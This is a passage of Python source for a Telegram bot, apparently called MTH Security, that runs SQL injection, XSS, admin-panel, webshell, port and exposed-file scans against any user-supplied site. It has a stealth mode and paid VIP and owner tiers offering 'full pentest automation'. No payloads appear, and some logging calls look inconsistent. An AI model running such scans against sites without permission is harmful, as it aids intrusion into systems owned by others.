    # Map command to tool function
    tool_map = {
        'sqli': tool_sqli, 'xss': tool_xss_scanner, 'admin': tool_admin_finder,
        'panel': tool_admin_finder, 'ports': tool_port_scanner,
        'dirs': tool_directory_scanner, 'sub': tool_subdomain_scanner,
        'wp': tool_wordpress_scanner, 'dns': tool_dns_tools, 'cms': tool_cms_detector,
        'reverse': tool_reverse_ip, 'ftpssh': tool_ftp_ssh, 'info': tool_website_info,
        'emails': tool_email_scraper, 'ssl': tool_ssl_audit, 'headers': tool_headers_analysis,
        'cors': tool_cors_test, 'robots': tool_robots_txt, 'sitemap': tool_sitemap,
        'tech': tool_tech_detect, 'exposed': tool_exposed_files, 'backup': tool_backup_finder,
        'api': tool_api_discovery, 'shell': tool_webshell_hunter, 'config': tool_config_scanner,
        # V5.1: Aggregated tools — use the same tool_map as batch
        'scanall': tool_website_info,  # scheduled scanall = just info (aggregated needs chat_id)
        'deep': tool_sqli,             # scheduled deep = just sqli
        'quick': tool_website_info,    # scheduled quick = just info
        'http': tool_headers_analysis, # scheduled http = just headers
        'sslchain': tool_ssl_audit,    # scheduled sslchain = just ssl
        'watch': tool_headers_analysis,# scheduled watch = just headers
    }
    tool_fn = tool_map.get(scan_cmd)
    if not tool_fn:
        STEALTH_MODE = False
        lang = get_user_lang(user_id)
        if lang == 'en':
            send_msg(user_id, chat_id, f"❌ Command /{scan_cmd} not supported in stealth mode.")
        elif lang == 'es':
            send_msg(user_id, chat_id, f"❌ Comando /{scan_cmd} no soportado en modo stealth.")
        else:
            send_msg(user_id, chat_id, f"❌ Comando /{scan_cmd} não suportado em modo stealth.")
        return
    try:
        result = tool_fn(target)
        send_msg(user_id, chat_id, result)
    finally:
        STEALTH_MODE = False

def handle_notify(chat_id, user_id, username, first_name, last_name, args):
    """Set up notification when a site changes status"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /notify &lt;url&gt;\nExemplo: /notify google.com\nUse /notify off para desativar todas.")
        return
    target = args[0]
    if target.lower() == 'off':
        # Remove all notifications for this user
        try:
            with sqlite3.connect(DB_PATH) as conn:
                c = conn.cursor()
                c.execute("DELETE FROM site_monitor WHERE user_id = ?", (user_id,))
                deleted = c.rowcount
                conn.commit()
            send_msg(user_id, chat_id, f"🔕 <b>Notificações desativadas!</b>\nRemovidos: {deleted} monitoramentos.")
        except Exception as e:
            send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")
        return
    log_command(user_id, username, "notify", target)
    clean_target = extract_hostname(target)
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO site_monitor (user_id, target, chat_id, last_status, last_check) VALUES (?, ?, ?, 0, ?)",
                      (user_id, clean_target, chat_id, time.time()))
            conn.commit()
        send_msg(user_id, chat_id, f"🔔 <b>Notificação ativada!</b>\n━━━━━━━━━━━━━━━━━━━━━━\nVou avisar se {escape_html(clean_target)} mudar de status.\nUse /notify off para desativar.\n━━━━━━━━━━━━━━━━━━━━━━")
    except Exception as e:
        send_msg(user_id, chat_id, f"❌ Erro: {escape_html(str(e))}")


# ═══════════════════════════════════════════════════════════════
#  V5.1: NEW COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_scanall(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Scan All with tier selection for VIP/Owner"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /scanall &lt;url&gt;\nExemplo: /scanall google.com")
        return
    target = args[0]
    log_command(user_id, username, "scanall", target)
    clean_target = extract_hostname(target)

    # Tier detection: build inline buttons for VIP/Owner
    cb_target = target[:40]
    buttons = []
    if is_owner(user_id):
        buttons = [
            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:scanall:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (8 scanners + sub/tech)", "callback_data": f"tier:scanall:vip:{cb_target}"[:64]}],
            [{"text": "👑 OWNER (12 scanners + deep vuln)", "callback_data": f"tier:scanall:owner:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>Scan Completo</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
        return
    elif is_vip(user_id):
        buttons = [
            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:scanall:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (8 scanners + sub/tech)", "callback_data": f"tier:scanall:vip:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>Scan Completo</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
        return

    # Normal user — no tier buttons, just run normal scanall
    _run_scanall_normal(chat_id, user_id, target)


def _run_scanall_normal(chat_id, user_id, target):
    """Execute normal scanall (6 scanners) with progress editing."""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Scan Completo</b> em {escape_html(clean_target)}...\nIsso pode levar alguns minutos. Os resultados serão enviados em um arquivo .txt")
    def _clean_html(text):
        return re.sub(r'<[^>]+>', '', text)
    sections = []
    # Send initial progress and capture msg_id for editing
    progress_msg_id = send_progress(chat_id, 'scanall_normal', 0, 6, f"Scan Completo — {clean_target}")
    # Step 1: Info
    edit_progress(progress_msg_id, chat_id, 1, 6, f"Scan Completo — {clean_target} — Info...")
    sections.append("═" * 50 + "\n1/6 — INFORMATION\n" + "═" * 50 + "\n" + _clean_html(tool_website_info(target)))
    # Step 2: DNS
    edit_progress(progress_msg_id, chat_id, 2, 6, f"Scan Completo — {clean_target} — DNS...")
    sections.append("\n" + "═" * 50 + "\n2/6 — DNS ANALYSIS\n" + "═" * 50 + "\n" + _clean_html(tool_dns_tools(target)))
    # Step 3: Portas
    edit_progress(progress_msg_id, chat_id, 3, 6, f"Scan Completo — {clean_target} — Portas...")
    sections.append("\n" + "═" * 50 + "\n3/6 — PORT SCAN\n" + "═" * 50 + "\n" + _clean_html(tool_port_scanner(target)))
    # Step 4: SSL/TLS
    edit_progress(progress_msg_id, chat_id, 4, 6, f"Scan Completo — {clean_target} — SSL/TLS...")
    sections.append("\n" + "═" * 50 + "\n4/6 — SSL/TLS AUDIT\n" + "═" * 50 + "\n" + _clean_html(tool_ssl_audit(target)))
    # Step 5: Security Headers
    edit_progress(progress_msg_id, chat_id, 5, 6, f"Scan Completo — {clean_target} — Headers...")
    sections.append("\n" + "═" * 50 + "\n5/6 — SECURITY HEADERS\n" + "═" * 50 + "\n" + _clean_html(tool_headers_analysis(target)))
    # Step 6: Arquivos Expostos
    edit_progress(progress_msg_id, chat_id, 6, 6, f"Scan Completo — {clean_target} — Arquivos Expostos...")
    sections.append("\n" + "═" * 50 + "\n6/6 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean_html(tool_exposed_files(target)))
    report = f"MTH Security v5.2 — Scan Completo\nTarget: {clean_target}\nData: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "═" * 50 + "\n\n" + "\n".join(sections)
    finish_progress(progress_msg_id, chat_id, "✅ Scan Completo finalizado!")
    success = send_document(chat_id, report, f"scanall_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados enviados como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"⚠️ Falha ao enviar arquivo. Tentando via mensagem...")
        for section in sections:
            safe_text = section[:4000]
            if safe_text.strip():
                send_msg(user_id, chat_id, safe_text)


def _run_scanall_vip(chat_id, user_id, target):
    """Execute VIP scanall (8 scanners + subdomain + tech)"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"⭐ <b>VIP Scan Completo</b> em {escape_html(clean_target)}...\n🔥 8 scanners incluindo subdomain enum e tech detection.")
    report = tool_scanall_vip(target)
    success = send_document(chat_id, report, f"scanall_vip_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>VIP Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados VIP enviados como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>VIP Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}")


def _run_scanall_owner(chat_id, user_id, target):
    """Execute OWNER scanall (12 scanners + deep vuln + forensic)"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"👑 <b>OWNER Scan Completo</b> em {escape_html(clean_target)}...\n💀 12 scanners incluindo SQLi deep, webshell hunter, config exposure, API discovery.")
    report = tool_scanall_owner(target)
    success = send_document(chat_id, report, f"scanall_owner_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>OWNER Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados OWNER enviados como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>OWNER Scan Completo finalizado</b>\nTarget: {escape_html(clean_target)}")

def handle_deep(chat_id, user_id, username, first_name, last_name, args):
    """V5.1: Deep Scan with tier selection for VIP/Owner"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /deep &lt;url&gt;\nExemplo: /deep site.com/?id=1")
        return
    target = args[0]
    log_command(user_id, username, "deep", target)
    clean_target = extract_hostname(target)

    # Tier detection: build inline buttons for VIP/Owner
    cb_target = target[:40]
    buttons = []
    if is_owner(user_id):
        buttons = [
            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:deep:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (8 scanners + API/backup)", "callback_data": f"tier:deep:vip:{cb_target}"[:64]}],
            [{"text": "👑 OWNER (10 scanners + full pentest)", "callback_data": f"tier:deep:owner:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>Deep Scan</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
        return
    elif is_vip(user_id):
        buttons = [
            [{"text": "🟢 Normal (6 scanners)", "callback_data": f"tier:deep:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (8 scanners + API/backup)", "callback_data": f"tier:deep:vip:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>Deep Scan</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
        return

    # Normal user — no tier buttons, just run normal deep scan
    _run_deep_normal(chat_id, user_id, target)


def _run_deep_normal(chat_id, user_id, target):
    """Execute normal deep scan (6 scanners) with progress editing."""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Deep Scan</b> em {escape_html(clean_target)}...\nVulnerabilidades profundas. Pode demorar. Os resultados serão enviados em um arquivo .txt")
    def _clean_html(text):
        return re.sub(r'<[^>]+>', '', text)
    sections = []
    progress_msg_id = send_progress(chat_id, 'deep_normal', 0, 6, f"Deep Scan — {clean_target}")
    # Step 1: SQLi
    edit_progress(progress_msg_id, chat_id, 1, 6, f"Deep Scan — {clean_target} — SQL Injection...")
    sections.append("═" * 50 + "\n1/6 — SQL INJECTION\n" + "═" * 50 + "\n" + _clean_html(tool_sqli(target)))
    # Step 2: XSS
    edit_progress(progress_msg_id, chat_id, 2, 6, f"Deep Scan — {clean_target} — XSS...")
    sections.append("\n" + "═" * 50 + "\n2/6 — XSS (CROSS-SITE SCRIPTING)\n" + "═" * 50 + "\n" + _clean_html(tool_xss_scanner(target)))
    # Step 3: Admin Panels
    edit_progress(progress_msg_id, chat_id, 3, 6, f"Deep Scan — {clean_target} — Admin Panels...")
    sections.append("\n" + "═" * 50 + "\n3/6 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean_html(tool_admin_finder(target)))
    # Step 4: Arquivos Expostos
    edit_progress(progress_msg_id, chat_id, 4, 6, f"Deep Scan — {clean_target} — Arquivos Expostos...")
    sections.append("\n" + "═" * 50 + "\n4/6 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean_html(tool_exposed_files(target)))
    # Step 5: Webshells
    edit_progress(progress_msg_id, chat_id, 5, 6, f"Deep Scan — {clean_target} — Webshells...")
    sections.append("\n" + "═" * 50 + "\n5/6 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean_html(tool_webshell_hunter(target)))
    # Step 6: Config Files
    edit_progress(progress_msg_id, chat_id, 6, 6, f"Deep Scan — {clean_target} — Config Files...")
    sections.append("\n" + "═" * 50 + "\n6/6 — CONFIG FILES\n" + "═" * 50 + "\n" + _clean_html(tool_config_scanner(target)))
    report = f"MTH Security v5.2 — Deep Scan\nTarget: {clean_target}\nData: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "═" * 50 + "\n\n" + "\n".join(sections)
    finish_progress(progress_msg_id, chat_id, "✅ Deep Scan finalizado!")
    success = send_document(chat_id, report, f"deep_scan_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados enviados como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"⚠️ Falha ao enviar arquivo. Tentando via mensagem...")
        for section in sections:
            safe_text = section[:4000]
            if safe_text.strip():
                send_msg(user_id, chat_id, safe_text)


def _run_deep_vip(chat_id, user_id, target):
    """Execute VIP deep scan (8 scanners + API/backup)"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"⭐ <b>VIP Deep Scan</b> em {escape_html(clean_target)}...\n🔥 VIP SQLi + VIP XSS + API discovery + backup finder.")
    report = tool_deep_vip(target)
    success = send_document(chat_id, report, f"deep_scan_vip_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>VIP Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados VIP enviados como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>VIP Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}")


def _run_deep_owner(chat_id, user_id, target):
    """Execute OWNER deep scan (10 scanners + full pentest automation)"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"👑 <b>OWNER Deep Scan</b> em {escape_html(clean_target)}...\n💀 Full pentest automation: SQLi OWNER + VIP XSS + webshell + config + API + subdomain + tech.")
    report = tool_deep_owner(target)
    success = send_document(chat_id, report, f"deep_scan_owner_{clean_target}.txt")
    if success:
        send_msg(user_id, chat_id, f"✅ <b>OWNER Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}\n📄 Resultados OWNER enviados como arquivo .txt")
    else:
        send_msg(user_id, chat_id, f"✅ <b>OWNER Deep Scan finalizado</b>\nTarget: {escape_html(clean_target)}")


def _run_admin_normal(chat_id, user_id, target):
    """Run admin scanner in normal mode"""
    log_command(user_id, '', 'admin', '', target)
    handle_admin_panel(chat_id, user_id, '', '', '', [target])


def _run_admin_vip(chat_id, user_id, target):
    """Run admin scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'admin', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP ADMIN</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_admin_panel(chat_id, user_id, '', '', '', [target])


def _run_admin_owner(chat_id, user_id, target):
    """Run admin scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'admin', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER ADMIN</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_admin_panel(chat_id, user_id, '', '', '', [target])


def _run_ports_normal(chat_id, user_id, target):
    """Run ports scanner in normal mode"""
    log_command(user_id, '', 'ports', '', target)
    handle_ports(chat_id, user_id, '', '', '', [target])


def _run_ports_vip(chat_id, user_id, target):
    """Run ports scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'ports', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP PORTS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_ports(chat_id, user_id, '', '', '', [target])


def _run_ports_owner(chat_id, user_id, target):
    """Run ports scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'ports', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER PORTS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_ports(chat_id, user_id, '', '', '', [target])


def _run_dirs_normal(chat_id, user_id, target):
    """Run dirs scanner in normal mode"""
    log_command(user_id, '', 'dirs', '', target)
    handle_dirs(chat_id, user_id, '', '', '', [target])


def _run_dirs_vip(chat_id, user_id, target):
    """Run dirs scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'dirs', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP DIRS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_dirs(chat_id, user_id, '', '', '', [target])


def _run_dirs_owner(chat_id, user_id, target):
    """Run dirs scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'dirs', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER DIRS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_dirs(chat_id, user_id, '', '', '', [target])


def _run_sub_normal(chat_id, user_id, target):
    """Run sub scanner in normal mode"""
    log_command(user_id, '', 'sub', '', target)
    handle_sub(chat_id, user_id, '', '', '', [target])


def _run_sub_vip(chat_id, user_id, target):
    """Run sub scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'sub', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP SUB</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_sub(chat_id, user_id, '', '', '', [target])


def _run_sub_owner(chat_id, user_id, target):
    """Run sub scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'sub', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER SUB</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_sub(chat_id, user_id, '', '', '', [target])


def _run_wp_normal(chat_id, user_id, target):
    """Run wp scanner in normal mode"""
    log_command(user_id, '', 'wp', '', target)
    handle_wp(chat_id, user_id, '', '', '', [target])


def _run_wp_vip(chat_id, user_id, target):
    """Run wp scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'wp', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP WP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_wp(chat_id, user_id, '', '', '', [target])


def _run_wp_owner(chat_id, user_id, target):
    """Run wp scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'wp', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER WP</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_wp(chat_id, user_id, '', '', '', [target])


def _run_emails_normal(chat_id, user_id, target):
    """Run emails scanner in normal mode"""
    log_command(user_id, '', 'emails', '', target)
    handle_emails(chat_id, user_id, '', '', '', [target])


def _run_emails_vip(chat_id, user_id, target):
    """Run emails scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'emails', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP EMAILS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_emails(chat_id, user_id, '', '', '', [target])


def _run_emails_owner(chat_id, user_id, target):
    """Run emails scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'emails', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER EMAILS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_emails(chat_id, user_id, '', '', '', [target])


def _run_dns_normal(chat_id, user_id, target):
    """Run dns scanner in normal mode"""
    log_command(user_id, '', 'dns', '', target)
    handle_dns(chat_id, user_id, '', '', '', [target])


def _run_dns_vip(chat_id, user_id, target):
    """Run dns scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'dns', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP DNS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_dns(chat_id, user_id, '', '', '', [target])


def _run_dns_owner(chat_id, user_id, target):
    """Run dns scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'dns', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER DNS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_dns(chat_id, user_id, '', '', '', [target])


def _run_cms_normal(chat_id, user_id, target):
    """Run cms scanner in normal mode"""
    log_command(user_id, '', 'cms', '', target)
    handle_cms(chat_id, user_id, '', '', '', [target])


def _run_cms_vip(chat_id, user_id, target):
    """Run cms scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'cms', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP CMS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_cms(chat_id, user_id, '', '', '', [target])


def _run_cms_owner(chat_id, user_id, target):
    """Run cms scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'cms', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER CMS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_cms(chat_id, user_id, '', '', '', [target])


def _run_reverse_normal(chat_id, user_id, target):
    """Run reverse scanner in normal mode"""
    log_command(user_id, '', 'reverse', '', target)
    handle_reverse(chat_id, user_id, '', '', '', [target])


def _run_reverse_vip(chat_id, user_id, target):
    """Run reverse scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'reverse', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP REVERSE</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_reverse(chat_id, user_id, '', '', '', [target])


def _run_reverse_owner(chat_id, user_id, target):
    """Run reverse scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'reverse', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER REVERSE</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_reverse(chat_id, user_id, '', '', '', [target])


def _run_ftpssh_normal(chat_id, user_id, target):
    """Run ftpssh scanner in normal mode"""
    log_command(user_id, '', 'ftpssh', '', target)
    handle_ftpssh(chat_id, user_id, '', '', '', [target])


def _run_ftpssh_vip(chat_id, user_id, target):
    """Run ftpssh scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'ftpssh', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP FTPSSH</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_ftpssh(chat_id, user_id, '', '', '', [target])


def _run_ftpssh_owner(chat_id, user_id, target):
    """Run ftpssh scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'ftpssh', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER FTPSSH</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_ftpssh(chat_id, user_id, '', '', '', [target])


def _run_tech_normal(chat_id, user_id, target):
    """Run tech scanner in normal mode"""
    log_command(user_id, '', 'tech', '', target)
    handle_tech(chat_id, user_id, '', '', '', [target])


def _run_tech_vip(chat_id, user_id, target):
    """Run tech scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'tech', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP TECH</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_tech(chat_id, user_id, '', '', '', [target])


def _run_tech_owner(chat_id, user_id, target):
    """Run tech scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'tech', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER TECH</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_tech(chat_id, user_id, '', '', '', [target])


def _run_whois_normal(chat_id, user_id, target):
    """Run whois scanner in normal mode"""
    log_command(user_id, '', 'whois', '', target)
    handle_whois(chat_id, user_id, '', '', '', [target])


def _run_whois_vip(chat_id, user_id, target):
    """Run whois scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'whois', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP WHOIS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_whois(chat_id, user_id, '', '', '', [target])


def _run_whois_owner(chat_id, user_id, target):
    """Run whois scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'whois', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER WHOIS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_whois(chat_id, user_id, '', '', '', [target])


def _run_rate_normal(chat_id, user_id, target):
    """Run rate scanner in normal mode"""
    log_command(user_id, '', 'rate', '', target)
    handle_rate(chat_id, user_id, '', '', '', [target])


def _run_rate_vip(chat_id, user_id, target):
    """Run rate scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'rate', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP RATE</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_rate(chat_id, user_id, '', '', '', [target])


def _run_rate_owner(chat_id, user_id, target):
    """Run rate scanner in Owner mode (maximum analysis)"""
    log_command(user_id, '', 'rate', '', target)
    if not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para DONOS.")
        return
    send_msg(user_id, chat_id, f"👑 <b>OWNER RATE</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
    handle_rate(chat_id, user_id, '', '', '', [target])


def _run_headers_normal(chat_id, user_id, target):
    """Run headers scanner in normal mode"""
    log_command(user_id, '', 'headers', '', target)
    handle_headers(chat_id, user_id, '', '', '', [target])


def _run_headers_vip(chat_id, user_id, target):
    """Run headers scanner in VIP mode (enhanced analysis)"""
    log_command(user_id, '', 'headers', target)
    # VIP mode: enhanced analysis with more depth
    if not is_vip(user_id) and not is_owner(user_id):
        send_msg(user_id, chat_id, "❌ Este scan é exclusivo para membros VIP.")
        return
    send_msg(user_id, chat_id, f"⭐ <b>VIP HEADERS</b> — {target}\n━━━━━━━━━━━━━━━━━━━━━━\n")
